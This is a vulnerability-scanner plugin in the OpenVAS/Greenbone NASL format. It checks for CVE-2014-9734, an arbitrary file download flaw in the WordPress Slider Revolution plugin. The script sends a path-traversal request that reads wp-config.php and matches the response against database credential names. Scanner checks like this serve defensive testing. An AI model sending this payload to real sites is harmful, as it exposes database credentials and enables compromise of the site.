# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805670");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2014-9734");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-07-10 15:54:40 +0530 (Fri, 10 Jul 2015)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("WordPress Revslider Arbitrary File Download Vulnerability");

  script_tag(name:"summary", value:"wordpress slider revolution plugin is prone to arbitrary file download vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to download an arbitrary file.");

  script_tag(name:"insight", value:"The flaw is due to an improper input
  sanitization  of the img parameter in a revslider_show_image action to
  'wp-admin/admin-ajax.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to gain access to arbitrary files and to compromise
  the application.");

  script_tag(name:"affected", value:"WordPress Slider Revolution (revslider)
  plugin before 4.2.");

  script_tag(name:"solution", value:"Update to WordPress Slider Revolution 4.2 or
  later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/132366/");
  script_xref(name:"URL", value:"http://marketblog.envato.com/news/plugin-vulnerability/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://revolution.themepunch.com/");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';

if(http_vuln_check(port:port, url:url, check_header:TRUE,
                   pattern:"(DB_USER|DB_PASSWORD|DB_NAME)"))
{
  report = http_report_vuln_url( port:port, url:url );
  security_message(port:port, data:report);
  exit(0);
}
